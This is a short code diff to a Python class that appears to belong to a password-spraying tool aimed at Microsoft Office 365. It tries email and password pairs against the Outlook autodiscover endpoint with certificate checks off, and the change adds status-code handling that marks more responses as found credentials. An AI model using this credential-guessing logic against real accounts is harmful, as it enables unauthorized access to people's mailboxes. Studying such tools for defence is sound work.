@@ -80,8 +80,12 @@ class OWA:
         r = requests.get("https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml", auth=(email, self.password), headers=headers, verify=False)
         if r.status_code == 200:
             log.info(print_good(f"Found credentials: {email}:{self.password}"))
-        else:
+        elif r.status_code == 457:
+            log.info(print_good(f"Found credentials: {email}:{self.password}"))
+        elif r.status_code == 401:
             log.info(print_bad(f"Authentication failed: {email}:{self.password} (Invalid credentials)"))
+        else:
+            log.info(print_good(f"Unexpected status code: {email}:{self.password} (unknown)"))
 
     def auth(self, email):
         log = logging.getLogger(f"auth_owa({email})")
